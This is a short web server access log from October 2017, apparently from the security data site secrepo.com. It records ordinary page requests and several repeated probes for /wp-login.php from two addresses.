36.74.181.243 - - [10/Oct/2017:19:49:05 -0700] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
36.74.181.243 - - [10/Oct/2017:19:49:05 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
36.74.181.243 - - [10/Oct/2017:19:49:11 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
36.74.181.243 - - [10/Oct/2017:19:49:12 -0700] "GET / HTTP/1.1" 200 37415 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
101.226.125.111 - - [10/Oct/2017:19:49:27 -0700] "GET /self.logs HTTP/1.1" 301 499 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) \t\t\tChrome/55.0.2883.95 Safari/537.36" 
101.226.125.111 - - [10/Oct/2017:19:49:31 -0700] "GET /self.logs/ HTTP/1.1" 200 5994 "http://www.secrepo.com/self.logs" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) \t\t\tChrome/55.0.2883.95 Safari/537.36" 
219.230.67.151 - - [10/Oct/2017:19:53:50 -0700] "GET / HTTP/1.1" 200 11061 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
219.230.67.151 - - [10/Oct/2017:19:53:51 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
31.168.25.208 - - [10/Oct/2017:19:54:45 -0700] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
31.168.25.208 - - [10/Oct/2017:19:54:46 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
31.168.25.208 - - [10/Oct/2017:19:54:51 -0700] "GET /wp-login.php HTTP/1.1" 301 522 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
31.168.25.208 - - [10/Oct/2017:19:54:51 -0700] "GET /wp-login.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
219.230.67.151 - - [10/Oct/2017:19:54:55 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
31.168.25.208 - - [10/Oct/2017:19:54:57 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
